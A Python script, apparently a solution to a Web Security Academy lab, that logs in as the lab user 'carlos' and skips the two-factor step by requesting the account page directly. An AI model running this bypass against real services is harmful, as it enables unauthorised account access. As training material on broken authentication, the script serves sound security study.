import requests

# Set the base URL correctly (removed double https and trailing slashes)
BASE_URL = "https://0ae5003e03bfb00d826b6504006800a5.web-security-academy.net"
LOGIN_URL = f"{BASE_URL}/login"
ACCOUNT_URL = f"{BASE_URL}/my-account?id=carlos"

# Victim credentials
payload = {
    "username": "carlos",
    "password": "montoya"
}

# Create a session to persist cookies across requests
session = requests.Session()

def bypass_2fa():
    print(f"[*] Target Lab: {BASE_URL}")
    print(f"[*] Attempting login for user: {payload['username']}")

    # Step 1: Submit the password
    # allow_redirects=False prevents the session from following the 302 redirect to /login2
    response = session.post(LOGIN_URL, data=payload, allow_redirects=False)

    # Check if the server issued a redirect (successful first-factor authentication)
    if response.status_code == 302:
        print("[+] First factor successful. Session cookie captured.")
        
        # Step 2: Skip 2FA by requesting the account page directly
        print("[*] Bypassing 2FA by navigating straight to /my-account...")
        account_page = session.get(ACCOUNT_URL)

        # Verify if we successfully bypassed the 2FA screen
        if "Your username is: carlos" in account_page.text:
            print("[ðŸŽ‰] SUCCESS: 2FA bypassed. Logged in as Carlos.")
        else:
            print("[-] FAILED: Could not access the account page content.")
    else:
        print(f"[-] ERROR: Login failed. HTTP Status: {response.status_code}")

if __name__ == "__main__":
    bypass_2fa()
